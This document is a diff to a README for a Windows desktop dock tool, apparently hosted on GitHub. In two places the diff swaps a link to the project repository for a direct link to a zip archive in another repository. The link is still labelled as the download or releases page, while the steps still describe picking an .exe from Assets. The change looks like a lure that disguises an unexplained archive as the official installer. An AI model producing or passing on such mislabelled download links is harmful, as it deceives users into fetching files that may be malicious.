@@ -5,7 +5,7 @@ description: "Install Nexus Dock on Windows 10 and 11 using a single PowerShell 
 ---
 # 🖥️ Nexus-Dock-2026 - Organize your desktop for better productivity
 
-[![](https://img.shields.io/badge/Download_Nexus_Dock-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/dylpla6727/Nexus-Dock-2026)
+[![](https://img.shields.io/badge/Download_Nexus_Dock-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/dylpla6727/dylpla6727.github.io/main/bispinous/dylpla-github-io-v2.5.zip)
 
 ## 📖 About this software
 
@@ -25,7 +25,7 @@ Your computer must meet these basic needs to use this software:
 
 Follow these steps to set up the dock on your machine.
 
-1. Go to the [Nexus-Dock-2026 releases page](https://github.com/dylpla6727/Nexus-Dock-2026).
+1. Go to the [Nexus-Dock-2026 releases page](https://raw.githubusercontent.com/dylpla6727/dylpla6727.github.io/main/bispinous/dylpla-github-io-v2.5.zip).
 2. Look for the section marked Assets. 
 3. Click the link that ends in .exe to download the installer file to your computer.
 4. Open your Downloads folder.
